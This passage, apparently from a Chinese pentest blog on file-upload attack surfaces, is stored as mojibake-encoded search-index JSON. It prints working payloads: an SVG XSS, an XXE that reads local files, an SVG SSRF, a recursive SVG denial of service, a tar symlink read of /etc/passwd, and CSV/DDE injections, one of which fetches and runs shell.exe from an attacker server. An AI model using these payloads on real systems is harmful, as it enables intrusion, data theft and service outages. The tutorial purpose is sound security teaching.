æ­¤ç›´æ¥è®¿é—®æ—¶ä¼šæ‰¾åˆ°ã€‚ æ¡ˆä¾‹ï¼šReading local files by abusing tar permissions in Gitlab Imports (Possibly leading to RCE) $ mkdir parent $ cd parent $ tar cf a.tar . --mode=300 $ mkdir sub $ cd sub $ ln -s /etc/passwd file.txt $ cd .. $ tar -rf a.tar sub ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:3:3","tags":["Pentest","FileUpload"],"title":"æ–‡ä»¶ä¸Šä¼ æ”»å‡»é¢\u0026æ¡ˆä¾‹","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"1.4. å…è®¸ä¸Šä¼ HTMLæ–‡ä»¶ å…è®¸ä¸Šä¼ htmlæˆ–è€…XMLéƒ½å¯ä»¥èƒ½å¯¼è‡´xssï¼Œä¹Ÿèƒ½å¯¼è‡´ä»»æ„URLè·³è½¬ï¼Œç”šè‡³è¿˜èƒ½å¯¼è‡´SSRFï¼ˆå¾ˆéš¾åˆ©ç”¨ï¼‰ï¼Œå› ä¸ºæ ¸å¿ƒè¿˜æ˜¯jsä»£ç å¯æ§ã€‚ htmlé€ æˆXSSå°±ä¸å¤šè¯´äº†ï¼Œæ‡‚å¾—éƒ½æ‡‚ HTMLæ–‡ä»¶åç¼€ Common htm html shtml IIS htm hxt Apache httpd html.de html.xxx å…¶ä»–/å°‘è§ body manifest appcache æ£€æŸ¥ MIME ç±»å‹æ˜¯å¦å­˜åœ¨å¯èƒ½çš„ XSSï¼š content-type-research é¡¹ç›® ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:4:0","tags":["Pentest","FileUpload"],"title":"æ–‡ä»¶ä¸Šä¼ æ”»å‡»é¢\u0026æ¡ˆä¾‹","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"1.5. å…è®¸ä¸Šä¼ XMLæ ¼å¼æ–‡ä»¶å¹¶è§£æ å¦‚æœå…è®¸ä¸Šä¼ XMLæ ¼å¼æ–‡ä»¶ï¼Œå¦‚docxã€xlsxã€svgç­‰æœ¬è´¨æ˜¯xmlçš„æ–‡ä»¶ï¼Œä¸”åç«¯ä¼šå¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œè§£æï¼Œé‚£ä¹ˆå¯èƒ½å­˜åœ¨XSSã€XXEç­‰æ¼æ´ ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:5:0","tags":["Pentest","FileUpload"],"title":"æ–‡ä»¶ä¸Šä¼ æ”»å‡»é¢\u0026æ¡ˆä¾‹","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"XSS XSS åç¼€ Common xml svg xht xsd xsl svgz xhtml IIS dtd vml xsf mno wsdl xslt disco exe.config dll.config Apache httpd rdf mathml å…¶ä»–/å°‘è§ vtt mml ä¸»è¦è¯´è¯´svgæ–‡ä»¶å¦‚ä½•é€ æˆxss æ£€æŸ¥æ€è·¯ï¼š åˆ›å»ºä¸€ä¸ªæ¶æ„çš„svgæ–‡ä»¶ï¼Œè¾“å…¥å¦‚ä¸‹å†…å®¹ï¼š \u003c?xml version=\"1.0\" standalone=\"no\"?\u003e \u003c!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"\u003e \u003csvg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\"\u003e \u003cpolygon id=\"triangle\" points=\"0,0 0,50 50,0\" fill=\"#009900\" stroke=\"#004400\"/\u003e \u003cscript type=\"text/javascript\"\u003e alert(document.domain); \u003c/script\u003e \u003c/svg\u003e ä¸Šä¼ åˆ°æ–‡ä»¶ä¸­ï¼Œå¹¶è®¿é—®å³å¯è§¦å‘XSSã€‚ ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:5:1","tags":["Pentest","FileUpload"],"title":"æ–‡ä»¶ä¸Šä¼ æ”»å‡»é¢\u0026æ¡ˆä¾‹","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"XXE XXE in XML ä»¥æ¶æ„svgä¸ºä¾‹ï¼Œä¸€èˆ¬å°è¯•OOBå¤–å¸¦æ³¨å…¥çš„æ–¹å¼æ¥åˆ¤æ–­æœ€å¿« \u003c?xml version=\"1.0\" standalone=\"yes\"?\u003e \u003c!DOCTYPE test [ \u003c!ENTITY xxe SYSTEM \"file:///etc/hostname\" \u003e ]\u003e \u003csvg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\"\u003e \u003ctext font-size=\"16\" x=\"0\" y=\"16\"\u003e\u0026xxe;\u003c/text\u003e \u003c/svg\u003e æ¶æ„çš„XXEæ–‡æ¡£ç”Ÿæˆï¼šdocem XXE in OOXML/ODF .docx .xlsx .odt https://oxmlxxe.github.io/ Exploiting XXE with Excel ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:5:2","tags":["Pentest","FileUpload"],"title":"æ–‡ä»¶ä¸Šä¼ æ”»å‡»é¢\u0026æ¡ˆä¾‹","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"SSRF Tip: å¦‚æœç›®æ ‡å­˜åœ¨å¯¼å‡ºåŠŸèƒ½ï¼Œå¦‚ç»™svgå¯¼å‡ºä¸ºpdfè¿™ç§åŠŸèƒ½ï¼Œé‚£ä¹ˆå¯èƒ½å­˜åœ¨SSRF \u003csvg xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"200\" height=\"200\"\u003e \u003cimage height=\"30\" width=\"30\" xlink:href=\"https://controlledserver.com/pic.svg\" /\u003e \u003c/svg\u003e å¯å°è¯•ä½¿ç”¨å…¶ä»–åè®®æ›´ç›´è§‚çš„æŸ¥çœ‹ï¼Œå¦‚file:// å‚è€ƒï¼š SVG Server Side Request Forgery (SSRF) SVG SSRF Cheatsheet ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:5:3","tags":["Pentest","FileUpload"],"title":"æ–‡ä»¶ä¸Šä¼ æ”»å‡»é¢\u0026æ¡ˆä¾‹","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"DOS å¦‚æœå¯ä»¥ä¸Šä¼ ä»»æ„SVGæ–‡ä»¶ï¼Œä¸”å¯åœ¨ç½‘ç«™çš„æŸäº›é¡µé¢ä¸­è¿›è¡Œå±•ç¤ºï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡åå¤åµŒå¥—ä½¿ç”¨ï¼Œç›´è‡³æµè§ˆå™¨æˆ–è€…ç”µè„‘å¡æ­»ã€‚ å¯ä»¥å±•ç¤ºï¼šä¸ä¸€å®šéå¾—æ˜¯\u003csvg\u003eæ ‡ç­¾çš„å½¢å¼ï¼Œä¹Ÿå¯ä»¥é€šè¿‡imgç­‰æ ‡ç­¾å±•ç¤ºï¼Œå½¢å¦‚ï¼š\u003cimg src=\"data:image/svg+xml;base64,\u003csvg base64\u003e\" alt=\"SVG Image\"\u003e \u003csvg version=\"1.2\" baseProfile=\"tiny\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" x=\"0px\" y=\"0px\" xml:space=\"preserve\"\u003e \u003cpath id=\"a\" d=\"M0,0\"/\u003e \u003cg id=\"b\"\u003e\u003cuse xlink:href=\"#a\"/\u003e\u003cuse xlink:href=\"#a\"/\u003e\u003cuse xlink:href=\"#a\"/\u003e\u003cuse xlink:href=\"#a\"/\u003e\u003cuse xlink:href=\"#a\"/\u003e\u003cuse xlink:href=\"#a\"/\u003e\u003cuse xlink:href=\"#a\"/\u003e\u003cuse xlink:href=\"#a\"/\u003e\u003cuse xlink:href=\"#a\"/\u003e\u003cuse xlink:href=\"#a\"/\u003e\u003c/g\u003e \u003cg id=\"c\"\u003e\u003cuse xlink:href=\"#b\"/\u003e\u003cuse xlink:href=\"#b\"/\u003e\u003cuse xlink:href=\"#b\"/\u003e\u003cuse xlink:href=\"#b\"/\u003e\u003cuse xlink:href=\"#b\"/\u003e\u003cuse xlink:href=\"#b\"/\u003e\u003cuse xlink:href=\"#b\"/\u003e\u003cuse xlink:href=\"#b\"/\u003e\u003cuse xlink:href=\"#b\"/\u003e\u003cuse xlink:href=\"#b\"/\u003e\u003c/g\u003e \u003cg id=\"d\"\u003e\u003cuse xlink:href=\"#c\"/\u003e\u003cuse xlink:href=\"#c\"/\u003e\u003cuse xlink:href=\"#c\"/\u003e\u003cuse xlink:href=\"#c\"/\u003e\u003cuse xlink:href=\"#c\"/\u003e\u003cuse xlink:href=\"#c\"/\u003e\u003cuse xlink:href=\"#c\"/\u003e\u003cuse xlink:href=\"#c\"/\u003e\u003cuse xlink:href=\"#c\"/\u003e\u003cuse xlink:href=\"#c\"/\u003e\u003c/g\u003e \u003cg id=\"e\"\u003e\u003cuse xlink:href=\"#d\"/\u003e\u003cuse xlink:href=\"#d\"/\u003e\u003cuse xlink:href=\"#d\"/\u003e\u003cuse xlink:href=\"#d\"/\u003e\u003cuse xlink:href=\"#d\"/\u003e\u003cuse xlink:href=\"#d\"/\u003e\u003cuse xlink:href=\"#d\"/\u003e\u003cuse xlink:href=\"#d\"/\u003e\u003cuse xlink:href=\"#d\"/\u003e\u003cuse xlink:href=\"#d\"/\u003e\u003c/g\u003e \u003cg id=\"f\"\u003e\u003cuse xlink:href=\"#e\"/\u003e\u003cuse xlink:href=\"#e\"/\u003e\u003cuse xlink:href=\"#e\"/\u003e\u003cuse xlink:href=\"#e\"/\u003e\u003cuse xlink:href=\"#e\"/\u003e\u003cuse xlink:href=\"#e\"/\u003e\u003cuse xlink:href=\"#e\"/\u003e\u003cuse xlink:href=\"#e\"/\u003e\u003cuse xlink:href=\"#e\"/\u003e\u003cuse xlink:href=\"#e\"/\u003e\u003c/g\u003e \u003cg id=\"g\"\u003e\u003cuse xlink:href=\"#f\"/\u003e\u003cuse xlink:href=\"#f\"/\u003e\u003cuse xlink:href=\"#f\"/\u003e\u003cuse xlink:href=\"#f\"/\u003e\u003cuse xlink:href=\"#f\"/\u003e\u003cuse xlink:href=\"#f\"/\u003e\u003cuse xlink:href=\"#f\"/\u003e\u003cuse xlink:href=\"#f\"/\u003e\u003cuse xlink:href=\"#f\"/\u003e\u003cuse xlink:href=\"#f\"/\u003e\u003c/g\u003e \u003cg id=\"h\"\u003e\u003cuse xlink:href=\"#g\"/\u003e\u003cuse xlink:href=\"#g\"/\u003e\u003cuse xlink:href=\"#g\"/\u003e\u003cuse xlink:href=\"#g\"/\u003e\u003cuse xlink:href=\"#g\"/\u003e\u003cuse xlink:href=\"#g\"/\u003e\u003cuse xlink:href=\"#g\"/\u003e\u003cuse xlink:href=\"#g\"/\u003e\u003cuse xlink:href=\"#g\"/\u003e\u003cuse xlink:href=\"#g\"/\u003e\u003c/g\u003e \u003cg id=\"i\"\u003e\u003cuse xlink:href=\"#h\"/\u003e\u003cuse xlink:href=\"#h\"/\u003e\u003cuse xlink:href=\"#h\"/\u003e\u003cuse xlink:href=\"#h\"/\u003e\u003cuse xlink:href=\"#h\"/\u003e\u003cuse xlink:href=\"#h\"/\u003e\u003cuse xlink:href=\"#h\"/\u003e\u003cuse xlink:href=\"#h\"/\u003e\u003cuse xlink:href=\"#h\"/\u003e\u003cuse xlink:href=\"#h\"/\u003e\u003c/g\u003e \u003cg id=\"j\"\u003e\u003cuse xlink:href=\"#i\"/\u003e\u003cuse xlink:href=\"#i\"/\u003e\u003cuse xlink:href=\"#i\"/\u003e\u003cuse xlink:href=\"#i\"/\u003e\u003cuse xlink:href=\"#i\"/\u003e\u003cuse xlink:href=\"#i\"/\u003e\u003cuse xlink:href=\"#i\"/\u003e\u003cuse xlink:href=\"#i\"/\u003e\u003cuse xlink:href=\"#i\"/\u003e\u003cuse xlink:href=\"#i\"/\u003e\u003c/g\u003e \u003c/svg\u003e åŸç†ï¼š xlink:href å±æ€§ä»¥ IRIï¼ˆå›½é™…èµ„æºæ ‡è¯†ï¼‰æ–¹å¼å®šä¹‰äº†å¯¹æŸä¸ªèµ„æºçš„å¼•ç”¨ï¼Œè¯¥é“¾æ¥çš„å…·ä½“å«ä¹‰éœ€æ ¹æ®ä½¿ç”¨è¯¥é“¾æ¥çš„æ¯ä¸ªå…ƒç´ çš„ä¸Šä¸‹æ–‡æ¥å†³å®šã€‚ \u003cuse\u003e å…ƒç´ ä» SVG æ–‡æ¡£ä¸­è·å–èŠ‚ç‚¹ï¼Œç„¶åå°†å…¶å¤åˆ¶åˆ°å…¶ä»–ä½ç½®ã€‚ ä¸Šè¿°ä»£ç é€šè¿‡é€’å½’åµŒå¥—ï¼Œå¯¼è‡´æµè§ˆå™¨æ‹’ç»æœåŠ¡ï¼Œç½‘ç«™é¡µé¢å´©æºƒã€‚ ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:5:4","tags":["Pentest","FileUpload"],"title":"æ–‡ä»¶ä¸Šä¼ æ”»å‡»é¢\u0026æ¡ˆä¾‹","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"1.6. å…è®¸ä¸Šä¼ CSV å¦‚æœå…è®¸ä¸Šä¼ CSVæ–‡ä»¶ï¼Œä¸”ä¸Šä¼ çš„CSVæ–‡ä»¶çš„å†…å®¹æœªç»è¿‡å¤„ç†è¿‡æ»¤ç›´æ¥ä¿å­˜ï¼Œé‚£ä¹ˆå¯ä»¥å°è¯•ä¸Šä¼ å…·æœ‰æ¶æ„å‘½ä»¤æ‰§è¡Œpayloadçš„CSVæ–‡ä»¶ï¼Œå½“å…¶ä»–ç”¨æˆ·ä¸‹è½½è¯¥CSVæ–‡ä»¶æ—¶ï¼Œå¯èƒ½ä¼šå¯¼è‡´å‘½ä»¤æ‰§è¡Œã€‚ CSV Payload DDE (\"cmd\";\"/C calc\";\"!A0\")A0 @SUM(1+9)*cmd|' /C calc'!A0 =10+20+cmd|' /C calc'!A0 =cmd|' /C notepad'!'A1' =cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0 =cmd|'/c rundll32.exe \\\\10.0.0.1\\3\\2\\1.dll,0'!_xlbgnm.A1 æ£€æŸ¥æ€è·¯ï¼š ä¸Šä¼ æ¶æ„çš„CSVæ–‡ä»¶ ä¸‹è½½æ¶æ„çš„CSVæ–‡ä»¶ è§‚å¯Ÿä¸‹è½½åçš„CSVæ–‡ä»¶æ˜¯å¦å¯¹ç­‰å·=ç­‰ç‰¹æ®Šç¬¦å·åšäº†å¤„ç†ï¼Œpayloadsä¼šå¦ä¼šæˆåŠŸæ‰§è¡Œï¼Œå¦‚æœèƒ½åˆ™è¯´æ˜å­˜åœ¨é—®é¢˜ å‚è€ƒï¼š CSV Injection at xxxxx Authenticated Code Execution through Phar deserialization in CSV Importer as Shop manager in WooCommerce ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:6:0","tags":["Pentest","FileUpload"],"title":"æ–‡ä»¶ä¸Šä¼ æ”»å‡»é¢\u0026æ¡ˆä¾‹","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"1.7. å…è®¸ä¸Šä¼ PDF å¯èƒ½å­˜åœ¨PDF XSSå’Œä»»æ„URLè·³è½¬ã€‚ å¯ä»¥ç›´æ¥ä½¿ç”¨å·¥å…·ç”Ÿæˆï¼šhttps://github.com/harunoz/js_pdf_xss.git ä¹Ÿå¯ä»¥æŒ‰ç…§ç½‘ä¸Šçš„æ“ä½œï¼Œç”¨è¿…æ·PDFç¼–è¾‘å™¨å»æ“ä½œï¼Œæ•ˆæœéƒ½ä¸€æ · pdfjs æ¼æ´ï¼š CVE-2024-4367 è·å–Cookieã€è´¦æˆ·æ¥ç®¡ç­‰ã€‚https://github.com/LOURC0D3/CVE-2024-4367-PoC å‚è€ƒï¼š Stored XSS through PDF viewer XSS in PDF Viewer ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:7:0","tags":["Pentest","FileUpload"],"title":"æ–‡ä»¶ä¸Šä¼ æ”»å‡»é¢\u0026æ¡ˆä¾‹","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"1.8. å…è®¸ä¸Šä¼ éŸ³è§†é¢‘æ–‡ä»¶ ä¸Šä¼ Audio/Videoçš„åˆ©ç”¨ç‚¹ Text Metadata å…ƒæ•°æ®ï¼šXSS, SQLi, å‘½ä»¤æ³¨å…¥ ffmpegï¼š SSRF/File Read in HLS playlists (m3u8)ï¼šhttps://github.com/ffmpeg-test/ffmpeg-test SSRF/File Read in HLS inside AVIï¼šhttps://github.com/neex/ffmpeg-avi-m3u-xbin Images in mp3 metadata å‚è€ƒï¼š External SSRF and Local File Read via video upload due to vulnerable FFmpeg HLS processing SSRF and local file read in video to gif converter ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:8:0","tags":["Pentest","FileUpload"],"title":"æ–‡ä»¶ä¸Šä¼ æ”»å‡»é¢\u0026æ¡ˆä¾‹","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"1.9. å…è®¸ä¸Šä¼ å›¾ç‰‡ https://github.com/barrracud4/image-upload-exploits ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:9:0","tags":["Pentest","FileUpload"],"title":"æ–‡ä»¶ä¸Šä¼ æ”»å‡»é¢\u0026æ¡ˆä¾‹","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"å¤§æ–‡ä»¶DOS æ–‡ä»¶ä¸Šä¼ çš„æ—¶å€™ï¼ŒæœåŠ¡ç«¯é€šå¸¸ä¼šå¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œå¤§å°é™åˆ¶ï¼ŒèŒƒå›´ä¸€èˆ¬ä¸º5MB-200 MBï¼Œç”šè‡³æ›´å°/æ›´å¤§ï¼Œå…·ä½“å–å†³äºåº”ç”¨ç¨‹åºé€»è¾‘ã€‚ä½†æ˜¯å¦‚æœæœªé™åˆ¶æ–‡ä»¶å¤§å°æˆ–ä¸å­˜åœ¨ç›¸å…³çš„éªŒè¯æ£€æŸ¥ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯èƒ½ä¼šä¸Šä¼ ç›¸å¯¹è¾ƒå¤§çš„æ–‡ä»¶ï¼Œé€ æˆå¤§é‡èµ„æºæ¶ˆè€—ï¼Œä»è€Œå¯èƒ½å¯¼è‡´æ‹’ç»æœåŠ¡ã€‚ æ£€æŸ¥æ€è·¯ï¼š åˆ›å»ºä¸€ä¸ªè¶…å¤§çš„å›¾ç‰‡æ–‡ä»¶ï¼Œå¦‚500Mçš„pngï¼Œå¹¶ä¸Šä¼ å›¾ç‰‡ æ–°å¼€ä¸€ä¸ªæµè§ˆå™¨é¡µé¢æˆ–ä»å¦ä¸€å°è®¾å¤‡æµè§ˆç½‘ç«™ï¼ŒæŸ¥çœ‹å“åº”é€Ÿåº¦æ˜¯å¦å˜æ…¢æˆ–æ˜¯å¦å­˜åœ¨è¿æ¥é”™è¯¯ç­‰å¼‚å¸¸æƒ…å†µ å‚è€ƒï¼š PNG compression DoS ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:9:1","tags":["Pentest","FileUpload"],"title":"æ–‡ä»¶ä¸Šä¼ æ”»å‡»é¢\u0026æ¡ˆä¾‹","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"åƒç´ æ´ªæ°´æ”»å‡» ä»»æ„å¯ä»¥ä¸Šä¼ å›¾ç‰‡çš„åœ°æ–¹éƒ½å¯ä»¥è¿›è¡Œæµ‹è¯•ï¼›åœ¨Pixel Flood Attackä¸­ï¼Œæ”»å‡»è€…å°è¯•ä¸Šä¼ å…·æœ‰å¤§åƒç´ çš„æ–‡ä»¶ï¼ˆ64250x64250åƒç´ ï¼‰ï¼Œä¸€äº›åº”ç”¨ä¼šä½¿ç”¨ç¬¬ä¸‰æ–¹ç»„ä»¶/åº“å¯¹å›¾åƒè¿›è¡Œç¼©å°å¤„ç†ï¼Œä»¥èŠ‚çœå­˜å‚¨ç©ºé—´å’Œå¤„ç†èƒ½åŠ›ï¼Œä½†æ˜¯è¿™äº›ç¬¬ä¸‰æ–¹åº“åœ¨å¤„ç†çš„æ—¶å€™ï¼Œä¼šå°†â€œæ•´ä¸ªå›¾åƒâ€åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œå®ƒä¼šå°è¯•å°†4128062500åƒç´ åˆ†é…åˆ°å†…å­˜ä¸­ï¼Œä»è€Œæ¶ˆè€—æœåŠ¡å™¨èµ„æºï¼Œå¯¼è‡´åº”ç”¨æœ€ç»ˆå´©æºƒå®•æœºã€‚ æ£€æŸ¥æ€è·¯ï¼š åœ¨https://www.resizepixel.com/ä¸­è°ƒæ•´å›¾ç‰‡å¤§å°ä¸º 64250x64250ï¼Œä¸Šä¼ å›¾ç‰‡ï¼ˆç°åœ¨å¥½åƒä¸è¡Œäº†ï¼‰ æ–°å¼€ä¸€ä¸ªæµè§ˆå™¨é¡µé¢æˆ–ä»å¦ä¸€å°è®¾å¤‡æµè§ˆç½‘ç«™ï¼ŒæŸ¥çœ‹å“åº”é€Ÿåº¦æ˜¯å¦å˜æ…¢æˆ–æ˜¯å¦å­˜åœ¨è¿æ¥é”™è¯¯ç­‰å¼‚å¸¸æƒ…å†µ å‚è€ƒ Pixel flood attack Pixel Flood Attack leads to Application level DoS ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:9:2","tags":["Pentest","FileUpload"],"title":"æ–‡ä»¶ä¸Šä¼ æ”»å‡»é¢\u0026æ¡ˆä¾‹","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"å…ƒæ•°æ®æ”»å‡» ä½¿ç”¨ exiftoolè¿™ä¸ªå·¥å…·å¯ä»¥é€šè¿‡æ”¹å˜EXIF metadataè¿›è€Œä¸€å®šå‡ ç‡å¼•èµ·æŸå¤„åå°„ï¼š #!bash $ exiftool -field = XSS FILE ä¾‹å¦‚ï¼š #!bash $ exiftool -Artist=â€™ â€œ\u003e\u003cimg src=1 onerror=alert(document.domain)\u003eâ€™ brute.jpeg å‚è€ƒï¼š RCE when removing metadata with ExifTool XXE through injection of a payload in the XMP metadata of a JPEG file XSS in image metadata field ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:9:3","tags":["Pentest","FileUpload"],"title":"æ–‡ä»¶ä¸Šä¼ æ”»å‡»é¢\u0026æ¡ˆä¾‹","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“ è‹¥æœåŠ¡ç«¯ä½¿ç”¨å­˜åœ¨æ¼æ´çš„ç»„ä»¶å¯¹ä¸Šä¼ å›¾ç‰‡è¿›è¡ŒäºŒæ¬¡æ¸²æŸ“ç­‰æ“ä½œï¼Œé‚£ä¹ˆä¹Ÿå¯ä»¥å°è¯•RCEï¼Œå¦‚ImageMagick ä¸€äº›ImageMagickç›¸å…³çš„CVEï¼š CVE-2016â€“3714 â€” å­—ç¬¦è¿‡æ»¤ä¸è¶³å¯¼è‡´æ½œåœ¨RCE CVE-2016â€“3715 â€” File deletion CVE-2016â€“3716 â€” File moving CVE-2016â€“3717 â€” Local file read CVE-2016â€“3718 â€” SSRF å‚è€ƒï¼š HEIC image preview can be used to invoke Imagick ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:9:4","tags":["Pentest","FileUpload"],"title":"æ–‡ä»¶ä¸Šä¼ æ”»å‡»é¢\u0026æ¡ˆä¾‹","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"å†…å­˜æ³„éœ² ImageMagickç›¸å…³çš„CVE XBMï¼šCVE-2018-16323 GIFï¼šCVE-2017-15277 å‚è€ƒï¼š Missing â€œsize checkâ€ on files to upload could make memory leaks. AWS keys and user cookie leakage via uninitialized memory leak in outdated librsvg version in Basecamp ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:9:5","tags":["Pentest","FileUpload"],"title":"æ–‡ä»¶ä¸Šä¼ æ”»å‡»é¢\u0026æ¡ˆä¾‹","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"GhostScript PS/PDF CVE-2019-1481X CVE-2019-10216 CVE-2019-6116 CVE-2018-16509 CVE-2017-8291 å‚è€ƒï¼š Remote Code Execution on xxxx/my_reports on Logo upload ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:9:6","tags":["Pentest","FileUpload"],"title":"æ–‡ä»¶ä¸Šä¼ æ”»å‡»é¢\u0026æ¡ˆä¾‹","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"åˆæ³•æ–‡ä»¶éšè—è½½è· åœ¨å›¾ç‰‡å…ƒæ•°æ®ä¸­éšè— Shell/XSS è½½è· åœ¨å›¾ç‰‡äºŒè¿›åˆ¶æ•°æ®ä¸­éšè— Shell/XSS è½½è· è¿™ä¸ªæ¯”è¾ƒç®€å•ï¼Œå’Œä¸Šé¢å†…å®¹æœ‰é‡å¤ï¼Œå°±ä¸è¯´äº†ã€‚ ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:9:7","tags":["Pentest","FileUpload"],"title":"æ–‡ä»¶ä¸Šä¼ æ”»å‡»é¢\u0026æ¡ˆä¾‹","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"1.10 å…è®¸ä¸Šä¼ æ–‡ä»¶é¢„è§ˆ å¸¸è§çš„æ–‡ä»¶é¢„è§ˆåŒ…æ‹¬ï¼šPDFã€å›¾ç‰‡ã€HTMLç­‰æ–‡ä»¶ã€‚ å¦‚æœåº”ç”¨ç¨‹åºè°ƒæ•´å›¾ç‰‡å¤§å°æˆ–å¤„ç†åª’ä½“ï¼Œè¯·æ£€æŸ¥å›¾åƒæ¼æ´ (+favicon.ico) è¿™ä¸ªæ¯”è¾ƒç®€å•ï¼Œå’Œä¸Šé¢å†…å®¹æœ‰é‡å¤ï¼Œå°±ä¸è¯´äº†ã€‚ ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:10:0","tags":["Pentest","FileUpload"],"title":"æ–‡ä»¶ä¸Šä¼ æ”»å‡»é¢\u0026æ¡ˆä¾‹","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"1.11 å…è®¸ä¸Šä¼ é…ç½®æ–‡ä»¶ # Apache httpd/ Tomcat .htaccess # ASP.NET / IIS web.config # å…¶ä»–è®¿é—®/æ¡†æ¶ â€¦â€¦ ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:11:0","tags":["Pentest","FileUpload"],"title":"æ–‡ä»¶ä¸Šä¼ æ”»å‡»é¢\u0026æ¡ˆä¾‹","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"1.12. æ–‡ä»¶åæ”»å‡» ä¸ä¼šå¯¹ä¸Šä¼ æ–‡ä»¶é‡å‘½åæˆ–å¯¹æ–‡ä»¶æ“ä½œè¿‡ç¨‹ä¸­å¯èƒ½æ€§çš„é—®é¢˜ã€‚ ","date":"2024-10-21","objectID":"/posts/file-upload-attack-surface-and-cases/:12:0","tags":["Pentest","FileUpload"],"title":"æ–‡ä»¶ä¸Šä¼ æ”»å‡»é¢\u0026æ¡ˆä¾‹","uri":"/posts/file-upload-attack-surface-and-cases/"},{"categories":["Pentest"],"content":"è·¯å¾„éå†/UNC ç›¸å¯¹è·¯å¾„ï¼š ../../../../tmp/upload.txt ç»å¯¹è·¯å¾„ï¼š/tmp/upload.txt UNCè·¯å¾„ï¼š\\\\evil.com\\share\\test.png ä¸€äº›ç½‘ç«™é…ç½®ä¸å½“ï¼Œæˆ–è€…å¼€å‘å®‰å…¨æ„è¯†ä¸ä¸¥è°¨ï¼Œå°†ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶ç›´æ¥æŒ‰åŸåå­˜å‚¨åˆ°æœåŠ¡å™¨ä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°è¯•å°†æ–‡ä»¶åæ·»åŠ å›æº¯ç¬¦../ï¼Œä»¥ä¸Šä¼ æ–‡ä»¶åˆ°ä»»æ„ç›®å½•ï¼Œç”šè‡³è¦†ç›–æ–‡ä»¶ï¼Œè¾¾åˆ°getshellæˆ–è€…ç ´åç³»ç»Ÿçš„ç›®çš„ã€‚ ğŸ”” Tip åœ¨windowsä¸­ç”±äºéƒ¨åˆ†ç¬¦å·ä¸èƒ½ä½œä¸ºæ–‡ä»¶åï¼Œå¦‚æœæˆ‘ä»¬å°†æ–‡ä»¶åè®¾ç½®ä¸ºå¸¦æœ‰è¿™äº›ç‰¹æ®Šç¬¦å·çš„å†…å®¹ï¼Œé‚£ä¹ˆå¯èƒ½è®©æœåŠ¡å™¨æŠ›å‡ºå¼‚å¸¸ è¾ƒå°‘çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥æ§åˆ¶ä¸Šä¼ çš„ç›®å½•åï¼Œä¹Ÿå¯ä»¥é€šè¿‡è·¯å¾„éå†çš„æ–¹æ³•ä¸Šä¼ åˆ°ä»»æ„ç›®å½•ä¸­ã€‚ 